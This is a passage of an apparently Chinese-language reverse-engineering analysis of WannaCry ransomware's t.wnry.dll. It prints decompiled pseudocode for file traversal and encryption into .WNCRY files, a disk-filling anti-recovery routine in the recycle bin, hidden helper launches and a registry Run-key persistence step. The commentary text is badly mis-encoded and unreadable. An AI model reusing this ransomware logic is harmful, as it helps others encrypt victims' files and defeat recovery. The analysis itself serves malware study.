ç›´æ¥é€€å‡ºå‡½æ•° è¿™ä¸ªå‡½æ•°åœ¨å½“å‰è·¯å¾„é‡Œåˆ›å»º pky å’Œ ekyæ–‡ä»¶ï¼Œ pkyä¸ºå…¬é’¥ï¼Œekyä¸ºåŠ å¯†åçš„ç§é’¥ 6.1.4 CreateResFile çº¿ç¨‹å›è°ƒ+åˆ›å»º res æ–‡ä»¶1234567891011121314151617181920212223242526272829303132void __stdcall __noreturn CreateResFile(LPVOID lpThreadParameter) &#123; signed int index; // esi while ( !dword_1000DD90 ) &#123; SystemTime = time(0); // è¿”å›å½“å‰ç³»ç»Ÿæ—¶é—´ CreateRes(); // åˆ›å»ºå¹¶å†™å…¥00000000.resæ–‡ä»¶ index = 0; do // ä¼‘çœ 22ç§’ &#123; if ( dword_1000DD90 ) goto LABEL_6; Sleep(1000u); ++index; &#125; while ( index &lt; 0x19 ); &#125; LABEL_6: ExitThread(0); // é€€å‡ºçº¿ç¨‹ &#125; åœ¨å½“å‰å·¥ä½œè·¯å¾„åˆ›å»ºäº† res æ–‡ä»¶ï¼Œå¹¶å¾€é‡Œå†™æ•°æ®ï¼š å†™å…¥äº† 0x8ä¸ªå­—èŠ‚çš„éšæœºæ•° å’Œ 0x4 ä¸ªå­—èŠ‚çš„å½“å‰æ—¶é—´ 6.1.5 CheckDky çº¿ç¨‹å›è°ƒ+æ£€æµ‹æ–‡ä»¶å­˜åœ¨ä¸å¦12345678910111213141516171819202122void __stdcall __noreturn CheckDky(LPVOID lpThreadParameter) &#123; while ( 1 ) &#123; dword_1000DD8C = sub_10004500((int)lpThreadParameter); // æ£€æµ‹æ˜¯å¦å­˜åœ¨774F34B5.dkyè¿™ä¸ªæ–‡ä»¶ ç”±äºæ–‡ä»¶ä¸å­˜åœ¨ ç›´æ¥return if ( dword_1000DD8C ) break; Sleep(5000u); &#125; ExitThread(0); &#125; æ¯éš”5ç§’æ£€æµ‹æ—¶å€™å­˜åœ¨ dky æ–‡ä»¶ï¼Œå­˜åœ¨å°± å¼•å…¥ å…¬é’¥å¹¶ è¿›è¡Œ åŠ è§£å¯†æ“ä½œ 6.2 EncrypteAllFiles çº¿ç¨‹å›è°ƒ+åŠ å¯† (Important) ä½œä¸ºç—…æ¯’çš„æ ¸å¿ƒå‡½æ•°åµŒå¥—äº†ï¼Œé‡Œå¤–åµŒå¥—äº†å¾ˆå¤šå±‚ 6.2.1 ç¬¬ä¸€å±‚1234567891011121314151617Drives = GetLogicalDrives(); // è·å–é©±åŠ¨ä¸­æ‰€æœ‰ç£ç›˜ if ( !dword_1000DD8C ) &#123; while ( 1 ) &#123; Sleep(3000u); Drives_1 = Drives; Drives = GetLogicalDrives(); if ( Drives != Drives_1 ) // æ£€æµ‹æ˜¯å¦æœ‰æ–°çš„ç£ç›˜åŠ å…¥ å¾ªç¯æ£€æµ‹æ˜¯å¦æœ‰æ–°çš„ç£ç›˜åŠ å…¥ï¼Œæœ‰å°±åŠ å¯†ï¼Œæ²¡æœ‰å°±ä¸€ç›´å¾ªç¯ 6.2.2 ç¬¬äºŒå±‚1234567891011121314151617181920212223242526272829303132333435DWORD __stdcall sub_10005680(LPVOID Num_3) &#123; char Parameter; // [esp+0h] [ebp-930h] int v3; // [esp+92Ch] [ebp-4h] InitCritical(&amp;Parameter); // åˆå§‹åŒ–ä¸´ç•ŒåŒº v3 = 0; if ( MovFileToTemp(&amp;Parameter, FileName, (int)sub_10005340, (int)&amp;dword_1000DD8C) )// ç§»åŠ¨æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•ä¸‹å¹¶é‡å‘½åä¸º.WNCRTY &#123; EncryptFile((int)&amp;Parameter, (LONG)Num_3, 0);// åŠ å¯†ç£ç›˜ä¸Šçš„æ‰€æœ‰æ–‡ä»¶ FillDisk((int)Num_3); // åœ¨å›æ”¶ç«™åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ å¹¶ä¸”å¾ªç¯å†™å…¥æ•°æ®ç›´åˆ°ç£ç›˜ç©ºé—´ä¸è¶³ ReleaseResouce(&amp;Parameter); // é‡Šæ”¾èµ„æº ExitThread(0); &#125; v3 = -1; DeleteCritical(&amp;Parameter); // é‡Šæ”¾ä¸´ç•ŒåŒº return 0; &#125; ç¬¬äºŒå±‚ä¸­æœ‰ä¸‰ä¸ªæ¯”è¾ƒé‡è¦çš„å‡½æ•°ï¼Œèµ·åˆ°äº†é˜²æ­¢æ¢å¤è½¯ä»¶å¯¹åˆ é™¤æ–‡ä»¶è¿›è¡Œæ¢å¤ç­‰ä½œç”¨ 6.2.2.1 MoveFileToTemp ç§»åŠ¨æ–‡ä»¶å¹¶é‡å‘½å1234567891011121314151617181920212223242526272829303132result = (HGLOBAL)CreatePkyAndEky((_DWORD *)lpParameter + 1, lpFileName, 0);// åˆ›å»º00000000.pkyå’Œ00000000.ekyæ–‡ä»¶ æ­¤æ—¶æ–‡ä»¶å·²å­˜åœ¨ ç›´æ¥é€€å‡ºå‡½æ•° if ( result ) &#123; if ( lpFileName ) // lpFileName=00000000.pky CreatePkyAndEky((_DWORD *)v4 + 11, 0, 0); // å†ä¸€æ¬¡æ£€æµ‹æ˜¯å¦å­˜åœ¨è¿™ä¸¤ä¸ªæ–‡ä»¶ result = GlobalAlloc(0, 0x100000u); // ç”³è¯·0x10000å¤§å°çš„ç©ºé—´ *((_DWORD *)v4 + 0x132) = result; if ( result ) &#123; result = GlobalAlloc(0, 0x100000u); // å†æ¬¡ç”³è¯·0x10000å¤§å°çš„ç©ºé—´ *((_DWORD *)v4 + 0x133) = result; if ( result ) &#123; InitializeCriticalSection((LPCRITICAL_SECTION)(v4 + 1260)); *((_DWORD *)v4 + 310) = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, v4, 0, 0);// å°†æ–‡ä»¶ç§»åŠ¨åˆ°ä¸´æ—¶ç›®å½•ä¸‹å¹¶é‡å‘½åä¸ºWNCRTY è¯¥å‡½æ•°å•ç‹¬åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ å°†ä¸€éƒ¨åˆ†æ–‡æœ¬æ–‡ä»¶ç§»åŠ¨åˆ°ä¸´æ—¶ç›®å½•å¹¶é‡å‘½å å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™æ—¶æ–‡ä»¶å¹¶æ²¡æœ‰è¿›è¡ŒåŠ å¯†ï¼Œæ˜¯å¯ä»¥ç›´æ¥é€šè¿‡ä¿®æ”¹åç¼€åä¿®å¤çš„ 6.2.2.2 FillDisk å›æ”¶ç«™å¾ªç¯å†™å…¥123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107void *__cdecl FillDisk(int Num_3) &#123; hGlobal = (void *)GetDriveTypeW(RootPathName);// è·å–ç£ç›˜ç±»å‹ if ( hGlobal == (void *)DRIVE_FIXED ) // å¦‚æœæ˜¯å›ºå®šç£ç›˜ &#123; hGlobal = GlobalAlloc(0, 0xA00000u); // ç”³è¯·0xA00000å¤§å°çš„å›ºå®šç©ºé—´ hGlobal_1 = hGlobal; if ( hGlobal ) &#123; memset(hGlobal, 0x55u, 0xA00000u); // å°†ç”³è¯·çš„ç©ºé—´å…¨éƒ¨åˆå§‹åŒ–ä¸º5 FileName = 0; memset(&amp;v12, 0, 0x204u); v13 = 0; DeleteRecycleFile(Num_3, &amp;FileName); // åˆ é™¤$RECYCLEçš„hibsys.WNCRYTæ–‡ä»¶ hFile = CreateFileW(&amp;FileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);// åœ¨$RECYCLEä¸‹åˆ›å»ºä¸€ä¸ªhibsys.WNCRYT å±æ€§ä¸ºéšè— if ( hFile == (HANDLE)-1 ) &#123; hGlobal = GlobalFree(hGlobal_1); // åˆ›å»ºå¤±è´¥ç›´æ¥é‡Šæ”¾ç©ºé—´ &#125; else &#123; MoveFileExW(&amp;FileName, 0, MOVEFILE_DELAY_UNTIL_REBOOT);// åœ¨ç³»ç»Ÿä¸‹æ¬¡é‡æ–°å¯åŠ¨æ—¶æ­£å¼è¿›è¡Œç§»åŠ¨æ–‡ä»¶æ“ä½œ if ( !dword_1000DD8C ) &#123; LABEL_6: if ( GetDiskFreeSpaceExW( // è·å–Dç›˜çš„å‰©ä½™ç©ºé—´çš„å¤§å° ç¡®ä¿ç©ºé—´è¶³å¤Ÿ RootPathName, &amp;FreeBytesAvailableToCaller, &amp;TotalNumberOfBytes, &amp;TotalNumberOfFreeBytes) &amp;&amp; TotalNumberOfFreeBytes.QuadPart &gt; 0x40000000 ) &#123; index = 0; while ( WriteFile(hFile, hGlobal_1, 0xA00000u, &amp;NumberOfBytesWritten, 0) )// å°†0xA00000ä¸ªå­—èŠ‚çš„5å†™å…¥åˆ°hibsys.WNCRYT &#123; Sleep(0xAu); if ( (unsigned int)++index &gt;= 20 )// å¾ªç¯å†™å…¥20æ¬¡ &#123; Sleep(10000u); if ( !dword_1000DD8C ) goto LABEL_6; // å½“ç£ç›˜å‰©ä½™ç©ºé—´ä¸è¶³æ—¶è·³å‡ºå¾ªç¯ break; &#125; &#125; &#125; &#125; GlobalFree(hGlobal_1); // é‡Šæ”¾ç”³è¯·çš„å†…å­˜ FlushFileBuffers(hFile); // åˆ·æ–°æ–‡ä»¶ç¼“å†²åŒº CloseHandle(hFile); hGlobal = (void *)DeleteFileW(&amp;FileName);// åˆ é™¤ä¸´æ—¶ç›®å½•æ–‡ä»¶å¤¹ä¸‹çš„hibsys.WNCRYT &#125; &#125; &#125; return hGlobal; &#125; è¿™ä¸ªå‡½æ•° ä¼šåœ¨ $RECYCLE ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º hibsys.WNCRYT çš„æ–‡ä»¶å¹¶è®¾ç½®å±æ€§ä¸ºéšè—ï¼Œå¹¶å¾ªç¯å¾€è¿™ä¸ªæ–‡ä»¶å†™å…¥æ•°æ®ï¼ŒçŸ¥é“ç£ç›˜ç©ºé—´ä¸è¶³ åœ¨æˆ‘ä»¬çš„æµ‹è¯•ç¯å¢ƒä¸‹ï¼Œè¿™ä¸ªæ–‡ä»¶å·²ç»è¾¾åˆ°äº† 39ä¸ªG 6.2.2.3 EncryptFile åŠ å¯†ç£ç›˜ä¸Šçš„æ‰€æœ‰æ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071if ( a3 ) // æ¡ä»¶ä¸æˆç«‹ &#123; uDriveType = GetDriveTypeW; // è·å–ç£ç›˜ç±»å‹ if ( GetDriveTypeW(DirectoryName) == DRIVE_CDROM )// å¦‚æœæ˜¯CDé©±åŠ¨å™¨ç›´æ¥è¿”å› return; InterlockedExchange(&amp;Target, Value); // äº¤æ¢ä¸¤ä¸ªæ•° goto LABEL_12; &#125; if ( InterlockedExchangeAdd(&amp;Target, 0) != Value )// ç”¨äºå¯¹ä¸€ä¸ª32ä½æ•°å€¼æ‰§è¡ŒåŠ æ³•çš„åŸå­æ“ä½œ &#123; v3 = 0; while ( !GetDiskFreeSpaceExW( // è·å–Dç›˜çš„ç©ºä½™å®¹é‡ å¦‚æœå¤±è´¥ç›´æ¥è¿”å› DirectoryName, &amp;FreeBytesAvailableToCaller, &amp;TotalNumberOfBytes, &amp;TotalNumberOfFreeBytes) || !TotalNumberOfBytes.QuadPart ) &#123; Sleep(1000u); if ( ++v3 &gt;= 30 ) return; &#125; uDriveType = GetDriveTypeW; if ( GetDriveTypeW(DirectoryName) != DRIVE_CDROM )// è·å–ç£ç›˜ç±»å‹ &#123; LABEL_12: if ( uDriveType(DirectoryName) == DRIVE_FIXED )// å¦‚æœç£ç›˜ç±»å‹æ˜¯å›ºå®šç£ç›˜ &#123; lpPath = 0; memset(&amp;v11, 0, 0x204u); v12 = 0; GetRecyclePathOrTempPath(Value, &amp;lpPath);// è·å–Cç›˜ä¸‹ä¸´æ—¶æ–‡ä»¶å’Œå›æ”¶ç«™è·¯å¾„ GetFilePath((wchar_t *)Path, &amp;lpPath); //è·å–æ–‡ä»¶è·¯å¾„D:$RECYCLE0.WNCRYT &#125; LOWORD(v6) = 0; CoreEncryptFun((const wchar_t *)Path, DirectoryName, 1);// æ ¸å¿ƒå‡½æ•° åŠ å¯†æ“ä½œ è¯¥å‡½æ•°ä¸»ä½“ä»æ˜¯åŠ å¯†æ–‡ä»¶ä¹‹å‰çš„é¢„å¤„ç†éƒ¨åˆ†ï¼Œæ¶‰åŠå…·ä½“çš„åŠ å¯†è¿‡ç¨‹è¦è¿›å…¥CoreEncryptFun å‡½æ•°è¿›è¡Œåˆ†æã€‚ 6.2.3 ç¬¬ä¸‰å±‚TraverseAndEncryptFiles(v3, DirectoryName, (int)&amp;v15, -1, a3);// éå†æ‰€æœ‰æ–‡ä»¶ å¹¶ä¸”åŠ å¯† ç¬¬ä¸‰å±‚ä¸»è¦å°±æ˜¯é€’å½’è°ƒç”¨è¿™ä¸ªåŠ å¯†å‡½æ•°å¹¶å¯¹æ‰€æœ‰è¦åŠ å¯†æ–‡ä»¶è¿›è¡Œéå†ï¼Œä¸‹é¢æˆ‘ä»¬ç»§ç»­æ·±å…¥ 6.2.4 ç¬¬å››å±‚123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159FileKind = FilterPostFix(FindFileData.cFileName);// å¯¹åç¼€è¿›è¡Œè¿‡æ»¤ è¿”å›å€¼ä¸º1è¯´æ˜æ˜¯exeæˆ–dll 2è¯´æ˜æ˜¯æ–‡æœ¬æ–‡ä»¶æˆ–è€…å›¾ç‰‡ v48 = FileKind; if ( FileKind != (wchar_t *)6 // å¦‚æœåç¼€ä¸º.WNCRYç›´æ¥è·³è¿‡ &amp;&amp; FileKind != (wchar_t *)1 // å¦‚æœæ˜¯exeå’Œdllç›´æ¥è·³è¿‡éå†ä¸‹ä¸€ä¸ªæ–‡ä»¶ &amp;&amp; (FileKind || FindFileData.nFileSizeHigh &gt; 0 || FindFileData.nFileSizeLow &gt;= 0xC800000) ) &#123; wcsncpy(&amp;TaegetFileName, FindFileData.cFileName, 0x103u);// å°†æ–‡ä»¶åæ‹·è´åˆ°ç›®æ ‡å†…å­˜ wcsncpy(&amp;TargetFileFullPath, &amp;String, 0x167u);// å°†å®Œæ•´è·¯å¾„æ‹·è´åˆ°ç›®æ ‡å†…å­˜ dwFileSizeHigh = FindFileData.nFileSizeHigh; dwFileSizeLow = FindFileData.nFileSizeLow; sub_10003760(&amp;v32, &amp;v36, v33, &amp;TargetFileFullPath);// è¿™ä¸ªå‡½æ•°ä¼šæ“ä½œå®¹å™¨å°†å®¹å™¨çš„è®¡æ•°+1 &#125; &#125; &#125; &#125; &#125; &#125; hFile = hFindFile; &#125; while ( FindNextFileW(hFindFile, &amp;FindFileData) );// æŸ¥æ‰¾ä¸‹ä¸€ä¸ªæ–‡ä»¶ FindClose(hFile); for ( i = *(wchar_t )v33; i != v33; i = *(wchar_t )i )// å¾ªç¯åŠ å¯†æ‰€æœ‰çš„æ–‡ä»¶ &#123; if ( !EncryptAllFile(v5, i + 4, 1) ) // åŠ å¯†æ‰€æœ‰æ–‡ä»¶ sub_10003760((_DWORD *)a3, &amp;v36, *(_DWORD )(a3 + 4), i + 4); &#125; v14 = a4; if ( a4 == -1 ) &#123; v15 = Format; v14 = 0; if ( wcsnicmp(Format, asc_1000CC14, 2u) ) v14 = 1; else v15 = Format + 2; v16 = *v15; for ( j = v15; v16; ++j ) &#123; if ( v16 == 92 ) ++v14; v16 = j[1]; &#125; &#125; if ( v14 &lt;= 6 &amp;&amp; v34 &gt; 0 ) &#123; CopyReadMeTxt(Format); // å°†@Please_Read_Me@.txt æ‹·è´åˆ°Dç›˜ä¸‹ if ( v14 &gt; 4 ) CopyWanaDecryptor_0(Format); // å°†@WanaDecryptor@.exeæ‹·è´åˆ°Dç›˜ else CopyWanaDecryptor(Format); // å°†@WanaDecryptor@.exeæ‹·è´åˆ°Dç›˜ &#125; v18 = v30; if ( a5 ) &#123; v19 = *(_DWORD )v30; if ( *(void )v30 != v30 ) &#123; v20 = v14 + 1; do &#123; v21 = (wchar_t *)v19[3]; if ( !v21 ) v21 = (wchar_t *)`std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Nullstr&#x27;::`2&#x27;::_C; TraverseAndEncryptFiles((_DWORD *)v35, v21, a3, v20, a5);// é€’å½’éå†æ–‡ä»¶ v19 = (_DWORD *)*v19; v18 = v30; &#125; while ( v19 != v30 ); &#125; &#125; v22 = v18; LOBYTE(v49) = 0; v23 = (_DWORD *)*v18; if ( (_DWORD *)*v18 != v18 ) &#123; do &#123; v24 = v23; v23 = (_DWORD *)*v23; DeleteAllocMem(&amp;v29, (int)&amp;v36, v24); // é‡Šæ”¾æ‰€æœ‰ç”³è¯·çš„ç©ºé—´ è¯¥å‡½æ•°ä¼šé¦–å…ˆéå†æ‰€æœ‰çš„æ–‡ä»¶ï¼Œå¯¹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰§è¡Œä¸åŒçš„æ“ä½œå¹¶ä¸”å¯¹åç¼€åè¿›è¡Œè¿‡æ»¤ï¼Œè·³è¿‡@Please_Read_Me@.txtï¼Œ@WanaDecryptor@.exe.lnkï¼Œ@WanaDecryptor@.bmpæ€»ç»“ä¸ºæšä¸¾ 6.2.5 ç¬¬äº”å±‚1234567891011121314151617181920212223242526272829303132333435363738394041424344454647enum FILE_TYPE &#123; FILE_TYPE_NULL = 0, FILE_TYPE_EXEDLL, FILE_TYPE_DOC, FILE_TYPE_DOCEX, FILE_TYPE_WNCRYT, //.wncryt FILE_TYPE_WNCYR, //.wncyr FILE_TYPE_WNCRY //.wncry &#125; int __thiscall EncryptAllFile(const wchar_t this, wchar_t TargetFileFullPath, int Num_1) &#123; const wchar_t this_1; // edi int result; // eax this_1 = this; switch ( sub_10002E70(TargetFileFullPath, Num_1) )// æ ¹æ®è¿”å›å€¼ä¸åŒæ‰§è¡Œä¸åŒçš„æ“ä½œ &#123; case 0: return 1; case 2: DeleteFileW_Addr(TargetFileFullPath); return 1; case 3: if ( EncryptFiles(this_1, TargetFileFullPath, 3) )// åŠ å¯†æ–‡ä»¶ &#123; wcscat(TargetFileFullPath, WNCRT); wcscat(TargetFileFullPath + 360, WNCRT); ((_DWORD)TargetFileFullPath + 312) = 5; &#125; goto LABEL_5; case 4: // .jpg EncryptFiles(this_1, TargetFileFullPath, 4); result = 1; break; default: LABEL_5: result = 0; break; &#125; return result; &#125; é’ˆå¯¹è¯¥å‡½æ•°çš„åŠ å¯†ç­–ç•¥åšä¸€ä¸ªæ€»ç»“ï¼š åœ¨æšä¸¾æ–‡ä»¶ä¸­ï¼Œcmd=1ï¼Œä¼šå¯¹æ™®é€šæ–‡ä»¶ç›´æ¥åŠ å¯†ä¸º.WNCRYï¼Œä¸å†åŠ å…¥é“¾è¡¨ï¼Œå¤§æ–‡ä»¶å¤„ç†ä¸º.WNCYRï¼Œä»¥åŠå…¶ä»–æœªä½œå¤„ç†æ–‡ä»¶ç»§ç»­åŠ å…¥é“¾è¡¨ç­‰å¾…å¤„ç† æšä¸¾å®Œæˆåï¼Œcmdä»2-4ï¼Œæ¯ä¸ªcmdéå†éƒ½éå†åŠ å¯†æ–‡ä»¶ cmd=2ï¼ŒåŠ å¯†FILE_TYPE_DOCEXæ™®é€šæ–‡ä»¶ä¸º.WNCRYï¼ˆç§»å‡ºé“¾è¡¨ï¼‰ï¼Œä»¥åŠFILE_TYPE_DOCEXå¤§æ–‡ä»¶ä¸º.WNCYR cmd=2, åˆ é™¤.WNCRYT cmd=3, åŠ å¯†é“¾è¡¨ä¸­æ‰€æœ‰æ–‡ä»¶ï¼ˆç§»å‡ºé“¾è¡¨ï¼‰ cmd=4, åŠ å¯†å¯èƒ½å‰©ä½™é“¾è¡¨ä¸­çš„æ–‡ä»¶ è™½ç„¶æ“ä½œä¸åŒ ä½†æ˜¯åŠ å¯†å‡½æ•°æ˜¯åŒä¸€ä¸ª æ¥ä¸‹æ¥å†æ¬¡è¿›å…¥EncryptFiles 6.2.6 ç¬¬å…­å±‚ pTargetPostFix = wcsrchr(&amp;NewTargetFileFullPath, â€˜.â€™);// è·å–æ–‡ä»¶åç¼€å pTargetPostFix_1 = pTargetPostFix; if ( !pTargetPostFix ) { pTargetPostFix_2 = &NewTargetFileFullPath; goto LABEL_6; } IsWNCRY = wcsicmp(pTargetPostFix, WNCRT); // å°†åç¼€åä¸WNCRYæ¯”è¾ƒ pTargetPostFix_2 = pTargetPostFix_1; if ( IsWNCRY ) { LABEL_6: wcscat(pTargetPostFix_2, Source); // å­—ç¬¦ä¸²æ‹¼æ¥ åŸåç¼€+.WNCRY goto LABEL_8; } wcscpy(pTargetPostFix_1, Source); LABEL_8: if ( GetFileAttributesW(&amp;NewTargetFileFullPath) != -1 || StartEncryptFiles((char *)v9, (int)OldTargetFileFullPath, &amp;NewTargetFileFullPath, Num_4) )// å¼€å§‹åŠ å¯†æ–‡ä»¶ { if ( Num_4 == 4 ) sub_10002BA0(v9, OldTargetFileFullPath); result = 1; } else { DeleteFileW_Addr(&amp;NewTargetFileFullPath); result = 0; } return result; } è¿™ä¸ªå‡½æ•°ä»ç„¶æ˜¯ä½œä¸ºåŠ å¯†å‡½æ•°çš„å‡†å¤‡å·¥ä½œï¼Œè·å–æ–‡ä»¶çš„åç¼€åï¼Œå°†åç¼€åå’Œ.WNCRYåšæ¯”è¾ƒï¼Œå¦‚æœä¸€è‡´å°±ä¸åŠ å¯†ï¼Œç„¶åå°†åŸåç¼€ä¸.WNCRYåšæ‹¼æ¥ï¼Œç„¶åå¼€å§‹åŠ å¯†æ–‡ä»¶ 6.2.7 ç¬¬ä¸ƒå±‚ if ( !GetFileSizeEx(hFile_1, &amp;FileSize) ) // è·å–ç›®æ ‡æ–‡ä»¶å¤§å° { local_unwind2((int)&amp;ms_exc.registration, -1); return 0; } GetFileTime(hFile_1, &amp;CreationTime, &amp;LastAccessTime, &amp;LastWriteTime);// è·å–æ–‡ä»¶æ—¶é—´ if ( ReadFile_Addr(hFile_1, &amp;lpBuffer, 8, &amp;lpNumberOfBytesRead, 0)// è¯»å–0x8ä¸ªå­—èŠ‚çš„æ–‡ä»¶å†…å®¹ &amp;&amp; !memcmp(&amp;lpBuffer, aWanacry, 8u) // å°†0x8ä¸ªå­—èŠ‚ä¸WANACRY!æ¯”è¾ƒ 1&lt;!-- --&gt; è¯»å–æ–‡ä»¶å‰0x8ä¸ªå­—èŠ‚ï¼Œä¸WNACRYï¼ä½œæ¯”è¾ƒ 1&lt;!-- --&gt; SetFilePointer(hFile, 0, 0, 0); // å°†æ–‡ä»¶æŒ‡é’ˆé‡æ–°è®¾ç½®åˆ°æ–‡ä»¶å¼€å¤´ if ( a4 == 4 ) { swprintf(&amp;String, (size_t)aSS, NewTargetFileFullPath, aT);// æ‹¼æ¥å­—ç¬¦ä¸² åœ¨åŸæ–‡ä»¶ååŠ ä¸Š.WNCRYT NewhFile = (void *)CreateFileW_Addr(&amp;String, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);// åˆ›å»ºæ–‡ä»¶ 2ï¼ä½¿ç”¨æºæ–‡ä»¶å + .WNCRYT åˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºçš„æ–‡ä»¶ if ( !EncryptDatas(v32, &amp;pbBuffer, 0x10u, (int)&amp;v17, (int)&amp;v20) )// å¯¹æ•°æ®è¿›è¡ŒåŠ å¯† goto LABEL_39; sub_10005DC0(this_1 + 84, (int)&amp;pbBuffer, (int)off_1000D8D4, 16, 16); memset(&amp;pbBuffer, 0, 0x10u); if ( !WriteFile_Addr(NewhFile, aWanacry, 8, &amp;v35, 0)// å†™å…¥åˆ°åˆ›å»ºçš„æ–‡ä»¶-&gt;WANACRY! || !WriteFile_Addr(NewhFile, &amp;v20, 4, &amp;v35, 0)// å†™å…¥åˆ°åˆ›å»ºçš„æ–‡ä»¶-&gt;0x100 || !WriteFile_Addr(NewhFile, &amp;v17, v20, &amp;v35, 0)// å†™å…¥0x100ä¸ªå­—èŠ‚çš„åŠ å¯†æ•°æ®åˆ°æ–‡ä»¶ || !WriteFile_Addr(NewhFile, &amp;a4, 4, &amp;v35, 0)// å†™å…¥0x4åˆ°æ–‡ä»¶ || !WriteFile_Addr(NewhFile, &amp;FileSize, 8, &amp;v35, 0) )// å†™å…¥0x081006åˆ°æ–‡ä»¶ 1&lt;!-- --&gt; å°†åŠ å¯†åçš„æ•°æ®å†™å…¥åˆ°æ–°åˆ›å»ºçš„æ–‡ä»¶ä¸­ 1&lt;!-- --&gt; if ( !ReadFile_Addr(hFile_2, *((_DWORD *)this_1 + 306), 0x10000, &amp;lpNumberOfBytesRead, 0) || lpNumberOfBytesRead != 0x10000 ) // è¯»å–ç›®æ ‡æ–‡ä»¶ { 21: local_unwind2((int)&amp;ms_exc.registration, -1); return 0; } sub_10006940((int)(this_1 + 84), *((_DWORD *)this_1 + 306), *((char )this_1 + 307), 0x10000u, 1); if ( WriteFile_Addr(NewhFile, *((_DWORD *)this_1 + 307), 0x10000, &amp;v35, 0) &amp;&amp; v35 == 0x10000 )// å°†åŠ å¯†åçš„å†…å®¹å†™å…¥åˆ°æ–°æ–‡ä»¶ 1&lt;!-- --&gt; è¯»å–æºæ–‡ä»¶ï¼Œå¹¶å°†åŠ å¯†åçš„å†…å®¹å†™å…¥åˆ°æ–°åˆ›å»ºçš„æ–‡ä»¶ä¸­ åˆ°æ­¤ä¸ºæ­¢ï¼ŒåŠ å¯†å‡½æ•°çš„åˆ†æå·²ç»å®Œæˆ 6.3 å‰©ä½™å‡½æ•°åˆ†æè¿™éƒ¨åˆ†æˆ‘ä»¬å°†å¯¹ t.wnry.dll ä¸­å‰©ä½™çš„å‡½æ•°è¿›è¡Œé€ä¸€çš„åˆ†æ 6.3.1 StartTaskdl çº¿ç¨‹å›è°ƒ+éšè—å¯åŠ¨taskdl.exe if ( !CreateProcessA(0u, lpCommandLine, 0u, 0u, 0, 0x8000000u, 0u, 0u, &amp;StartupInfo, &amp;ProcessInformation) )// åˆ›å»ºTaskdl.exeè¿›ç¨‹ è¯¥å‡½æ•°æ¯éš”3ç§’ä¼šä»¥éšè—çš„æ–¹å¼å¯åŠ¨ taskdl.exe 6.3.2 StartExeAndSetRegçº¿ç¨‹å›è°ƒ+å¯åŠ¨taskse.exeå’Œ@WanaDecryptor@.exe)+ä¿®æ”¹æ³¨å†Œè¡¨ 123456789101112131415ReadFileToMem(&amp;c_wnryBase, 0); // è¯»å–c.wnryçš„å†…å®¹åˆ°å†…å­˜ &#125; StartTaskseAndDecryptor(); // å¯åŠ¨taskse.exeå’Œ@WanaDecryptor@.exe if ( v1 ) &#123; GetFullPathNameA(aTaskscheExe, 0x208u, &amp;Buffer, 0);// C:UsersDingisoDesktoptasksche.exe SetRegRun((int)&amp;Buffer); // è®¾ç½®æ³¨å†Œè¡¨å¯åŠ¨é¡¹ è¯¥å‡½æ•°æ¯éš”ä¸‰ç§’å¯åŠ¨taskse.exe å’Œ @WanaDecryptor@.exe ç„¶ååˆ©ç”¨ CMDè®¾ç½®æ³¨å†Œè¡¨å¯åŠ¨é¡¹ä¸º tasksche.exe çš„ç»å¯¹åœ°å€ 6.3.3 RepeatOperation é‡å¤æ“ä½œ12345678910111213141516171819202122232425if ( GetFileAttributesA(aFWnry) == -1 ) // æ£€æµ‹f.wnryæ˜¯å¦å­˜åœ¨ sub_100018F0(&amp;Parameter, 10, 100); if ( !CurrentTime ) &#123; CurrentTime = time(0); CreateRes(); // å†™å…¥0x8ä¸ªå­—èŠ‚åˆ°00000000.res sprintf(&amp;Dest, aSFi, NewFileName); // @WanaDecryptor@.exe fi StartTargetFile(&amp;Dest, 0x186A0u, 0); ReadFileToMem(&amp;c_wnryBase, 1); &#125; RunBat(); // åˆ›å»ºå¹¶å¯åŠ¨æ‰¹å¤„ç†è„šæœ¬ CreateReadMe(); // åˆ›å»º@Please_Read_Me@.txt EncryptOtherUsersFiles((int)&amp;Parameter); // åŠ å¯†windowså‰©ä½™æ‰€æœ‰ç”¨æˆ·çš„æ–‡ä»¶ è¯¥å‡½æ•°æœ‰ä¸‰ä¸ªé‡è¦çš„å‡½æ•°ï¼Œå°±ä¸å±•å¼€åˆ†æäº†ï¼Œæˆ‘åœ¨è¿™é‡Œå°†æŠŠä»–ä»¬çš„é€»è¾‘è¡¨è¿°æ¸…æ¥š RunBat():åˆ¤æ–­@WanaDecryptor@.exe.lnkæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±åˆ›å»ºä¸€ä¸ªæ‰¹å¤„ç†è„šæœ¬ï¼Œå°†å‘½ä»¤å†™å…¥.batè„šæœ¬è„šæœ¬ä½œç”¨ä¸ºç»™@WanaDecryptor@.exeåˆ›å»ºå¿«æ·æ–¹å¼ï¼‰ CreateReadMe():æ£€æµ‹å·¥ä½œè·¯å¾„ä¸‹æ˜¯å¦å­˜åœ¨ ReadMeä¸å­˜åœ¨å°±ä»r.wnryä¸­è¯»å–å†…å®¹å¹¶å†™å…¥ ReadMe EncryptOtherUsersFiles():è·å–Windowsæ‰€æœ‰çš„ç”¨æˆ·åï¼Œåˆ¤æ–­æ˜¯å¦ä¸å½“å‰çš„æœ‰æˆ·åç›¸åŒï¼Œä¸åŒå°±åŠ 